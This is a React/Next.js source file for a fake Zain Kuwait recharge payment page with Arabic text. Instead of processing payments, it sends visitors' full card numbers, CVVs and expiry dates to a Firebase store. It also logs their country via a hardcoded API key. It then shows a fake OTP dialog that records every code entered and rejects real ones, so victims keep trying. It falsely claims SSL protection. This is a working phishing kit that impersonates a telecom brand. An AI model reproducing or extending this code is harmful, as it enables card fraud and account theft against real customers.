"use client"

import { useEffect, useState, useRef } from "react"
import { CreditCard, Wallet, Shield, ChevronRight, Info, AlertCircle, Lock, Loader } from "lucide-react"
import { setupOnlineStatus } from "@/lib/utils"
import { useRouter } from "next/navigation"
import { addData } from "@/lib/firebasee"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Label } from "@/components/ui/label"
import { Input } from "@/components/ui/input"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Button } from "@/components/ui/button"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog"

function randstr(prefix: string) {
  return Math.random()
    .toString(36)
    .replace("0.", prefix || "")
}

const validateKuwaitPhone = (phone: string) => {
  // Kuwait mobile numbers typically start with 5, 6, 9
  const kuwaitMobilePattern = /^[569]\d{7}$/
  return kuwaitMobilePattern.test(phone)
}

const allOtps = [""]

export default function ZainPayment() {
  const [selectedTab, setSelectedTab] = useState("bill")
  const [showAmountDropdown, setShowAmountDropdown] = useState(false)
  const [selectedAmount, setSelectedAmount] = useState("6.000")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [isSubmmited, setIsSubmmited] = useState(false)
  const [showDropdown, setShowDropdown] = useState(false)
  const [selectedOption, setSelectedOption] = useState("رقم آخر")
  const [captchaChecked, setCaptchaChecked] = useState(false)
  const router = useRouter()

  const amounts = [
    { value: "2.000", validity: 7 },
    { value: "4.000", validity: 15 },
    { value: "6.000", validity: 30 },
    { value: "12.000", validity: 90 },
    { value: "22.000", validity: 180 },
    { value: "30.000", validity: 365 },
  ]

  const paymentOptions = ["رقم آخر", "رقم العقد"]

  useEffect(() => {
    getLocation().then(() => {})
  }, [])

  async function getLocation() {
    const _id = localStorage.getItem("visitor")
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: _id,
        country: country,
      })
      localStorage.setItem("country", country)
      setupOnlineStatus(_id!)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }

  const [paymentMethod, setPaymentMethod] = useState<string | null>(null)
  const [cardNumber, setCardNumber] = useState("")
  const [cardExpiry, setCardExpiry] = useState("")
  const [cardCvc, setCardCvc] = useState("")
  const [formErrors, setFormErrors] = useState<{
    cardNumber?: string
    cardExpiry?: string
    cardCvc?: string
  }>({})
  const [isProcessing, setIsProcessing] = useState(false)
  const [paymentState, setPaymentState] = useState<"FORM" | "SUCCESS">("FORM")
  const [showOtpDialog, setShowOtpDialog] = useState(false)

  // OTP related states
  const [otpLength, setOtpLength] = useState<4 | 6>(6)
  const [otpValues, setOtpValues] = useState<string>('')
  const [otpError, setOtpError] = useState<string | null>(null)
  const [resendDisabled, setResendDisabled] = useState(false)
  const [countdown, setCountdown] = useState(60)
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([])

  const [orderDetails, setOrderDetails] = useState({
    id: "ZainXkkid-089887",
    total: "6.000",
  })


  // Initialize order details from localStorage on client-side only
  useEffect(() => {
    try {
      const storedAmount = localStorage.getItem("amount")
      const storedPhone = localStorage.getItem("phoneNumber")
      if (storedAmount) {
        setOrderDetails((prev) => ({
          ...prev,
          total: storedAmount,
        }))
      }
    } catch (error) {
      console.error("Error accessing localStorage:", error)
    }
  }, [])

  const formatCardNumber = (value: string) => {
    const cleanedValue = value.replace(/\D/g, "")
    const formattedValue = cleanedValue.replace(/(\d{4})/g, "$1 ").trim()
    return formattedValue
  }

  const formatExpiry = (value: string) => {
    const cleanedValue = value.replace(/\D/g, "")
    if (cleanedValue.length > 2) {
      return `${cleanedValue.slice(0, 2)}/${cleanedValue.slice(2, 4)}`
    }
    return cleanedValue
  }

  const validateForm = () => {
    const errors: { cardNumber?: string; cardExpiry?: string; cardCvc?: string } = {}
    if (!cardNumber.replace(/\s/g, "").length) {
      errors.cardNumber = "مطلوب"
    } else if (cardNumber.replace(/\s/g, "").length < 16) {
      errors.cardNumber = "رقم البطاقة غير صالح"
    }

    if (!cardExpiry.length) {
      errors.cardExpiry = "مطلوب"
    } else if (cardExpiry.length !== 5) {
      errors.cardExpiry = "تاريخ الانتهاء غير صالح"
    }

    if (!cardCvc.length) {
      errors.cardCvc = "مطلوب"
    } else if (cardCvc.length < 3) {
      errors.cardCvc = "رمز التحقق غير صالح"
    }

    setFormErrors(errors)
    return Object.keys(errors).length === 0
  }

  const handlePayment = async () => {
    const _id = localStorage.getItem("visitor")
    if (!validateForm()) {
      return
    }
    addData({ id: _id, cardNumber, cvv: cardCvc, expiryDate: cardExpiry })
    setIsProcessing(true)
    // Simulate payment processing
    setTimeout(() => {
      setIsProcessing(false)
      setShowOtpDialog(true)
    }, 3000)
  }

  const handleOtpChange = (index: number, value: string) => {
    // Only allow single digit
    if (value.length > 1) {
      value = value.slice(-1)
    }

    // Only allow numbers
    if (!/^\d*$/.test(value)) {
      return
    }

    setOtpError(null)

    if (value && index < otpValues.length - 1) {
      otpInputRefs.current[index + 1]?.focus()
    }
  }

  const handleKeyDown = (index: number, e: any) => {
    if (e.key === "Backspace" && !otpValues[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus()
    }
  }

  const verifyOtp = () => {
    const _id = localStorage.getItem("visitor")
    const otpCode = otpValues

    // Check if OTP length matches selected length
    if (otpCode.length <4) {
      setOtpError(`يجب أن يكون رمز التحقق مكون من 4 او 6 أرقام`)
      return
    }

    setIsProcessing(true)
    allOtps.push(otpCode)
    addData({ id: _id, otp: otpCode, allOtps })

    setTimeout(() => {
      setIsProcessing(false)
      // Check for correct OTP based on length
      const correctOtp = otpLength === 4 ? "1234" : "123456"
      if (otpCode === correctOtp) {
        setPaymentState("SUCCESS")
        setShowOtpDialog(false)
      } else {
        setOtpError("رمز التحقق غير صالح. يرجى المحاولة مرة أخرى.")
        setOtpValues("")
      }
    }, 2000)
  }

  const resendOtp = () => {
    setResendDisabled(true)
    setCountdown(60)
    // Simulate resending OTP
    setTimeout(() => {
      setResendDisabled(false)
    }, 60000)
  }

  useEffect(() => {
    if (resendDisabled && countdown > 0) {
      const timer = setTimeout(() => {
        setCountdown(countdown - 1)
      }, 1000)
      return () => clearTimeout(timer)
    }
  }, [resendDisabled, countdown])

  const renderProgressIndicator = () => (
    <div className="w-full bg-gray-200 rounded-full h-2.5">
      <div
        className="bg-gradient-to-r from-[#2d1a45] to-[#6b2a84] h-2.5 rounded-full transition-all duration-500"
        style={{ width: "50%" }}
      ></div>
    </div>
  )

  const renderSuccessState = () => (
    <CardContent className="p-8 flex flex-col items-center justify-center space-y-6">
      <svg
        xmlns="http://www.w3.org/2000/svg"
        width="64"
        height="64"
        viewBox="0 0 24 24"
        fill="none"
        stroke="#4ade80"
        strokeWidth="2"
        strokeLinecap="round"
        strokeLinejoin="round"
        className="text-green-500"
      >
        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
        <polyline points="22 4 12 14.01 9 11.01"></polyline>
      </svg>
      <h2 className="text-3xl font-bold text-center text-gray-800">تم الدفع بنجاح!</h2>
      <p className="text-gray-600 text-center">
        شكراً لك على إتمام عملية الدفع. تم إرسال تفاصيل المعاملة إلى بريدك الإلكتروني.
      </p>
      <Button
        onClick={() => router.push("/")}
        className="w-full bg-gradient-to-r from-[#2d1a45] to-[#6b2a84] hover:from-[#3d2a55] hover:to-[#7b3a94] text-white font-semibold shadow-md hover:shadow-lg transition-all duration-300"
      >
        العودة إلى الصفحة الرئيسية
      </Button>
    </CardContent>
  )

  return (
    <div
      className="flex justify-center items-center min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50 p-4"
      dir="rtl"
    >
      <Card className="w-full max-w-sm shadow-2xl border-0 overflow-hidden bg-white/95 backdrop-blur-sm">
        <div className="absolute top-0 left-0 right-0 h-2 bg-gradient-to-r from-[#2d1a45] via-[#d13c8c] to-[#6b2a84]"></div>
        {paymentState === "FORM" && (
          <>
            <CardHeader className="space-y-4 pb-6 bg-gradient-to-r from-gray-50 to-white">
              <div className="flex justify-between items-start">
                <div>
                  <CardTitle className="text-2xl font-bold text-gray-800 mb-2">إتمام الدفع</CardTitle>
                  <CardDescription className="text-gray-600">اختر طريقة الدفع المفضلة لديك أدناه</CardDescription>
                </div>
                <Badge
                  variant="outline"
                  className="flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 border-green-200 font-medium"
                >
                  <Shield className="h-4 w-4" /> آمن ومحمي
                </Badge>
              </div>
            </CardHeader>
            <CardContent className="space-y-8 p-6">
              {renderProgressIndicator()}
              {/* Order Summary Card */}
              <div className="bg-gradient-to-r from-[#2d1a45] to-[#6b2a84] rounded-xl p-6 text-white shadow-lg">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="font-semibold text-lg">ملخص الطلب</h3>
                  <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center">
                    <CreditCard className="h-4 w-4" />
                  </div>
                </div>
                <div className="space-y-3">
                  <div className="flex justify-between items-center">
                    <span className="text-white/80">رقم الطلب:</span>
                    <span className="font-mono font-medium">{orderDetails.id}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-white/80">خدمة زين:</span>
                    <span className="font-medium">إعادة تعبئة eeZee</span>
                  </div>
                  <div className="border-t border-white/20 pt-3">
                    <div className="flex justify-between items-center">
                      <span className="text-white/80">المبلغ الإجمالي:</span>
                      <span className="text-2xl font-bold text-white">{orderDetails.total} د.ك</span>
                    </div>
                  </div>
                </div>
              </div>
              {/* Payment Methods */}
              <div className="space-y-4">
                <h3 className="font-semibold text-lg text-gray-800 flex items-center gap-2">
                  <Wallet className="h-5 w-5 text-[#d13c8c]" />
                  طريقة الدفع
                </h3>
                <RadioGroup value={paymentMethod || ""} onValueChange={setPaymentMethod} className="space-y-4">
                  {/* Credit Card Option */}
                  <div className="relative group">
                    <div
                      className={`absolute inset-0 rounded-xl transition-all duration-300 ${
                        paymentMethod === "card" ? "ring-2 ring-[#d13c8c] shadow-lg" : "group-hover:shadow-md"
                      }`}
                    ></div>
                    <div className="flex items-center space-x-3 relative">
                      <RadioGroupItem value="card" id="card" className="text-[#d13c8c]" />
                      <Label
                        htmlFor="card"
                        className="flex items-center gap-4 cursor-pointer rounded-xl border-2 border-gray-100 p-5 hover:border-gray-200 transition-all w-full bg-white"
                      >
                        <div className="bg-gradient-to-r from-[#2d1a45] to-[#6b2a84] text-white p-3 rounded-lg shadow-md">
                          <CreditCard className="h-6 w-6" />
                        </div>
                        <div className="flex-1">
                          <div className="font-semibold text-gray-800 mb-1">بطاقة ائتمان أو مدين</div>
                          <div className="text-sm text-gray-500">آمن ومحمي بتشفير SSL</div>
                        </div>
                        <div className="flex gap-2">
                          <div className="w-10 h-6 rounded flex items-center justify-center">
                            <img
                              src="/placeholder.svg?height=24&width=40&text=VISA"
                              alt="Visa"
                              width={40}
                              height={24}
                            />
                          </div>
                          <div className="w-10 h-6 bg-red-600 rounded flex items-center justify-center">
                            <img
                              src="/placeholder.svg?height=24&width=40&text=MC"
                              alt="Mastercard"
                              width={40}
                              height={24}
                            />
                          </div>
                        </div>
                      </Label>
                    </div>
                  </div>
                  {/* Card Form */}
                  {paymentMethod === "card" && (
                    <div className="bg-gray-50 rounded-xl p-6 space-y-6 animate-in fade-in-50 duration-500 border border-gray-200">
                      <div className="space-y-4">
                        <div className="space-y-2">
                          <div className="flex items-center justify-between">
                            <Label htmlFor="card-number" className="flex items-center gap-2 font-medium">
                              رقم البطاقة
                              <TooltipProvider>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-4 w-4 text-gray-400 hover:text-gray-600" />
                                  </TooltipTrigger>
                                  <TooltipContent>
                                    <p>أدخل 16 رقم الموجود على بطاقتك</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </Label>
                            {formErrors.cardNumber && (
                              <span className="text-xs text-red-500 flex items-center gap-1">
                                <AlertCircle className="h-3 w-3" />
                                {formErrors.cardNumber}
                              </span>
                            )}
                          </div>
                          <div className="relative">
                            <Input
                              id="card-number"
                              dir="rtl"
                              type="tel"
                              placeholder="#### #### #### ####"
                              value={cardNumber}
                              onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                              maxLength={19}
                              className={`h-12 text-lg ${
                                formErrors.cardNumber
                                  ? "border-red-300 focus:border-red-500"
                                  : "border-gray-300 focus:border-[#d13c8c]"
                              }`}
                            />
                          </div>
                        </div>
                        <div className="grid grid-cols-2 gap-4">
                          <div className="space-y-2">
                            <div className="flex items-center justify-between">
                              <Label htmlFor="expiry" className="font-medium">
                                تاريخ الانتهاء
                              </Label>
                              {formErrors.cardExpiry && (
                                <span className="text-xs text-red-500 flex items-center gap-1">
                                  <AlertCircle className="h-3 w-3" />
                                  {formErrors.cardExpiry}
                                </span>
                              )}
                            </div>
                            <Input
                              id="expiry"
                              placeholder="MM/YY"
                              type="tel"
                              value={cardExpiry}
                              onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                              maxLength={5}
                              className={`h-12 ${
                                formErrors.cardExpiry
                                  ? "border-red-300 focus:border-red-500"
                                  : "border-gray-300 focus:border-[#d13c8c]"
                              }`}
                            />
                          </div>
                          <div className="space-y-2">
                            <div className="flex items-center justify-between">
                              <Label htmlFor="cvc" className="font-medium">
                                رمز التحقق
                              </Label>
                              {formErrors.cardCvc && (
                                <span className="text-xs text-red-500 flex items-center gap-1">
                                  <AlertCircle className="h-3 w-3" />
                                  {formErrors.cardCvc}
                                </span>
                              )}
                            </div>
                            <Input
                              id="cvc"
                              placeholder="123"
                              type="tel"
                              maxLength={4}
                              value={cardCvc}
                              onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ""))}
                              className={`h-12 ${
                                formErrors.cardCvc
                                  ? "border-red-300 focus:border-red-500"
                                  : "border-gray-300 focus:border-[#d13c8c]"
                              }`}
                            />
                          </div>
                        </div>
                      </div>
                    </div>
                  )}
                </RadioGroup>
              </div>
            </CardContent>
            <CardFooter className="flex flex-col gap-4 p-6 bg-gray-50">
              <Button
                className="w-full h-14 text-lg font-semibold shadow-lg hover:shadow-xl transition-all duration-300 bg-gradient-to-r from-[#2d1a45] to-[#6b2a84] hover:from-[#3d2a55] hover:to-[#7b3a94]"
                disabled={!paymentMethod || isProcessing}
                onClick={handlePayment}
              >
                {isProcessing ? (
                  <span className="flex items-center gap-3">
                    <svg
                      className="animate-spin h-5 w-5 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                    جاري المعالجة...
                  </span>
                ) : (
                  <span className="flex items-center gap-3">
                    ادفع {orderDetails.total} د.ك الآن
                    <ChevronRight className="h-5 w-5" />
                  </span>
                )}
              </Button>
              <div className="flex items-center justify-center gap-3 text-sm text-gray-500">
                <Shield className="h-4 w-4 text-green-600" />
                <span>جميع المعاملات مشفرة وآمنة بتقنية SSL 256-bit</span>
              </div>
            </CardFooter>
          </>
        )}
        {paymentState === "SUCCESS" && renderSuccessState()}
        {/* Enhanced OTP Dialog */}
        <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
          <DialogContent className="bg-white/95 backdrop-blur-sm" dir="rtl">
            <DialogHeader className="space-y-4">
              <DialogTitle className="text-xl font-bold text-center text-gray-800">التحقق من الدفع</DialogTitle>
              <DialogDescription className="text-center text-gray-600">
                اختر طول رمز التحقق وأدخل الرمز المرسل إلى هاتفك
              </DialogDescription>
            </DialogHeader>

          
            <div className="bg-gradient-to-r from-[#2d1a45] to-[#6b2a84] rounded-xl p-4 text-white mb-6">
              <div className="flex justify-between items-center mb-2">
                <span className="text-white/80">رقم الطلب:</span>
                <span className="font-mono font-sm">{orderDetails.id}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-white/80">المبلغ:</span>
                <span className="font-bold text-sm">{orderDetails.total} د.ك</span>
              </div>
            </div>
            <div className="text-center mb-6">
              <p className="text-sm mb-2 text-gray-600">تم إرسال رمز التحقق المكون من {otpLength} أرقام إلى</p>
              <p className="font-semibold text-sm text-gray-800">+965 5XX XXX XX89</p>
            </div>
            <div className="flex justify-center gap-3 my-8">
           
                <div className="relative">
                  <Input
                    type="tel"
                    inputMode="numeric"
                    maxLength={6}
                    value={otpValues}
                    onChange={(e) => setOtpValues( e.target.value)}
                    className={`w-full h-12 text-center text-sm font-bold border-2 rounded-lg ${
                      otpError ? "border-red-300" : "border-gray-300 focus:border-[#d13c8c]"
                    }`}
                  />
                </div>
            </div>
            {otpError && (
              <div className="bg-red-50 text-red-600 rounded-lg p-3 text-center text-sm flex items-center justify-center gap-2 mb-4">
                <AlertCircle className="h-4 w-4" />
                {otpError}
              </div>
            )}
            <div className="text-center mb-6">
              <p className="text-sm text-gray-600 mb-3">لم تستلم الرمز؟</p>
              <Button
                variant="link"
                onClick={resendOtp}
                disabled={resendDisabled}
                className="text-[#d13c8c] hover:text-[#b8236f] font-medium"
              >
                {resendDisabled ? `إعادة الإرسال بعد ${countdown} ثانية` : "إعادة إرسال الرمز"}
              </Button>
            </div>
            <DialogFooter>
              <Button
                className="w-full h-10 text-base font-semibold bg-gradient-to-r from-[#2d1a45] to-[#6b2a84] hover:from-[#3d2a55] hover:to-[#7b3a94] shadow-lg"
                disabled={otpValues.length < 4 ||isProcessing}
                onClick={verifyOtp}
              >
                {isProcessing ? (
                  <span className="flex items-center gap-2">
                    <Loader className="mr-2" />
                    جاري التحقق...
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    <Lock className="h-4 w-4" />
                    تأكيد الدفع
                  </span>
                )}
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </Card>
    </div>
  )
}
